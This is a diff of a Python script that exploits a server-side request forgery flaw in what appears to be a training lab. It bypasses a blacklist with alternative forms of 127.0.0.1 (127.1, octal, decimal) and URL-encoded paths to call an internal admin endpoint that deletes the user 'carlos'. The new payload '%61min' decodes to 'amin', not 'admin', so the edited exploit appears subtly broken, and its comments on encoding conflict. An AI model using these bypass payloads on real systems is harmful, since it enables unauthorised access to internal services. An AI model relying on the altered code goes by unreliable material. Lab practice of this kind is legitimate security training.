@@ -4,8 +4,8 @@
 #Converted Octal IP :0177.0000.0000.0001 (017700000001)
 # all possible ip forms after testing are 127.1 , 0177.0000.0000.0001 (017700000001) , 2130706433 as 127.0.0.1 is black listed
 #word admin also is black listed and he perform check on single Url encoding 
-#admin and %61dmin are bocked
-#possible admin form is %25%36%31dmin
+#admin is bocked
+#possible admin form is %61dmin
 import requests
 import sys
 import urllib3
@@ -19,7 +19,7 @@ proxies ={'http' : 'http://127.0.0.1:8080' ,'https':'http://127.0.0.1:8080'}
 
 def delete_user(url):
     #ssrf payload
-    delete_user_url="http://127.1/%25%36%31dmin/delete?username=carlos" #SSRF payload
+    delete_user_url="http://127.1/%61min/delete?username=carlos" #SSRF payload request library will encode it once so we do not have to perform double URL encodind 
     check_stock_path="/product/stock"
     params_deletion={'stockApi':delete_user_url}
     #sending request to delete the user
@@ -60,4 +60,4 @@ if __name__ == "__main__":
     
 #to run this code
 #write in terminal
-#python3 SSRF_against_local_server.py "Url of the lab"   
+#python3 3SSRF_with_blacklist-based_input_filte.py "Url of the lab"   
